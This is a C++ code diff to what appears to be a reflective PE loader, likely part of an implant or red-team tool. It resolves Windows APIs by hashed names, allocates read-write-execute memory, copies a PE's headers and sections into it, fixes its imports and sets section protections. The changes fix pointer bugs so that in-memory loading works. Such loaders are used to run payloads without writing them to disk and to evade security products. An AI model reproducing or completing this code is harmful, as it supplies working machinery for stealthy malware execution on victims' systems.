@@ -40,6 +40,7 @@ auto DECLFN LoadEssentials(INSTANCE* Instance)->VOID {
 	Instance->Win32.GetProcAddress = (decltype(Instance->Win32.GetProcAddress))LoadApi(Kernel32, HashStr("GetProcAddress"));
 	Instance->Win32.GetModuleHandleA = (decltype(Instance->Win32.GetModuleHandleA))LoadApi(Kernel32, HashStr("GetModuleHandleA"));
 
+	Instance->Win32.NtAllocateVirtualMemory = (decltype(Instance->Win32.NtAllocateVirtualMemory))LoadApi(Ntdll, HashStr("NtAllocateVirtualMemory"));
 	Instance->Win32.NtProtectVirtualMemory = (decltype(Instance->Win32.NtProtectVirtualMemory))LoadApi(Ntdll, HashStr("NtProtectVirtualMemory"));
 	Instance->Win32.CommandLineToArgvW = (decltype(Instance->Win32.CommandLineToArgvW))LoadApi(Shell32, HashStr("CommandLineToArgvW"));
 
@@ -47,11 +48,6 @@ auto DECLFN LoadEssentials(INSTANCE* Instance)->VOID {
 	Instance->Win32.AllocConsoleWithOptions = (decltype(Instance->Win32.AllocConsoleWithOptions))LoadApi(Kernel32, HashStr("AllocConsoleWithOptions"));
 	Instance->Win32.FreeConsole = (decltype(Instance->Win32.FreeConsole))LoadApi(Kernel32, HashStr("FreeConsole"));
 
-	Instance->Win32.CreatePipe = (decltype(Instance->Win32.CreatePipe))LoadApi(Kernel32, HashStr("CreatePipe"));
-	Instance->Win32.CreateNamedPipeA = (decltype(Instance->Win32.CreateNamedPipeA))LoadApi(Kernel32, HashStr("CreateNamedPipeA"));
-	Instance->Win32.ConnectNamedPipe = (decltype(Instance->Win32.ConnectNamedPipe))LoadApi(Kernel32, HashStr("ConnectNamedPipe"));
-	Instance->Win32.DisconnectNamedPipe = (decltype(Instance->Win32.DisconnectNamedPipe))LoadApi(Kernel32, HashStr("DisconnectNamedPipe"));
-	Instance->Win32.FlushFileBuffers = (decltype(Instance->Win32.FlushFileBuffers))LoadApi(Kernel32, HashStr("FlushFileBuffers"));
 	Instance->Win32.ReadFile = (decltype(Instance->Win32.ReadFile))LoadApi(Kernel32, HashStr("ReadFile"));
 	Instance->Win32.WriteFile = (decltype(Instance->Win32.WriteFile))LoadApi(Kernel32, HashStr("WriteFile"));
 	Instance->Win32.SetStdHandle = (decltype(Instance->Win32.SetStdHandle))LoadApi(Kernel32, HashStr("SetStdHandle"));
@@ -142,7 +138,9 @@ auto DECLFN FixImp(
 	for ( ; ImpDesc->Name; ImpDesc++ ) {
 
 		PIMAGE_THUNK_DATA FirstThunk  = (PIMAGE_THUNK_DATA)( (UPTR)( Base ) + ImpDesc->FirstThunk );
-		PIMAGE_THUNK_DATA OriginThunk = (PIMAGE_THUNK_DATA)( (UPTR)( Base ) + ImpDesc->OriginalFirstThunk );
+		PIMAGE_THUNK_DATA OriginThunk = FirstThunk;
+		if (ImpDesc->OriginalFirstThunk)
+			OriginThunk = (PIMAGE_THUNK_DATA)( (UPTR)( Base ) + ImpDesc->OriginalFirstThunk );
 
 		PCHAR  DllName     = (CHAR*)( (UPTR)( Base ) + ImpDesc->Name );
 		PVOID  DllBase     = (PVOID)( Instance->Win32.GetModuleHandleA( DllName ) );
@@ -263,7 +261,7 @@ auto DECLFN FixArguments(WCHAR* wArguments) -> VOID {
 	}
 }
 
-auto DECLFN FixMemPermissions(ULONG_PTR PeBaseAddr, IMAGE_NT_HEADERS* Header, IMAGE_SECTION_HEADER* SecHeader) -> VOID {
+auto DECLFN FixMemPermissions(BYTE* PeBaseAddr, IMAGE_NT_HEADERS* Header, IMAGE_SECTION_HEADER* SecHeader) -> VOID {
 	G_INSTANCE
 	for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
 		ULONG OldProt = NULL;
@@ -286,11 +284,14 @@ auto DECLFN FixMemPermissions(ULONG_PTR PeBaseAddr, IMAGE_NT_HEADERS* Header, IM
 				NewProt = PAGE_NOACCESS;
 			}
 		}
-		ProtVm( 
-			( PVOID* )( PeBaseAddr + SecHeader[i].VirtualAddress ), 
-			( SIZE_T* )( SecHeader[i].Misc.VirtualSize ), 
-			NewProt, 
-			&OldProt 
+		BYTE*  SectionBase = PeBaseAddr + SecHeader[i].VirtualAddress;
+		SIZE_T SectionSize = SecHeader[i].Misc.VirtualSize;
+
+		ProtVm(
+			(PVOID*) &SectionBase,
+			&SectionSize,
+			NewProt,
+			&OldProt
 		);
 	}
 }
@@ -330,11 +331,20 @@ auto DECLFN Reflect( BYTE* Buffer, ULONG Size, WCHAR* Arguments ) {
 
 	Instance->Win32.DbgPrint("[+] Parsed PE headers.\n");
 
+	SIZE_T RegionSize = Size;
+
 	__asm("int3");
 	// Allocate memory for PE
-	AllocVm((PVOID*)PeBaseAddr, 0, (SIZE_T*)Size, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+	AllocVm((PVOID*)&PeBaseAddr, 0, &RegionSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
 
 	Instance->Win32.DbgPrint("[+] Allocated memory for PE at: %p\n", PeBaseAddr);
+
+	Mem::Copy(
+		PeBaseAddr,
+		Buffer,
+		Header->OptionalHeader.SizeOfHeaders
+	);
+	Instance->Win32.DbgPrint("[+] Copied PE headers to allocated memory.\n");
 
 	// Copy PE headers
 	for(int i=0; i < Header->FileHeader.NumberOfSections; i++) {
@@ -355,7 +365,7 @@ auto DECLFN Reflect( BYTE* Buffer, ULONG Size, WCHAR* Arguments ) {
 	}
 
 	// Fix memory permissions
-	FixMemPermissions((ULONG_PTR)PeBaseAddr, Header, SecHeader);
+	FixMemPermissions(PeBaseAddr, Header, SecHeader);
 
 	BOOL isDllFile = (Header->FileHeader.Characteristics & IMAGE_FILE_DLL) ? TRUE : FALSE;
 
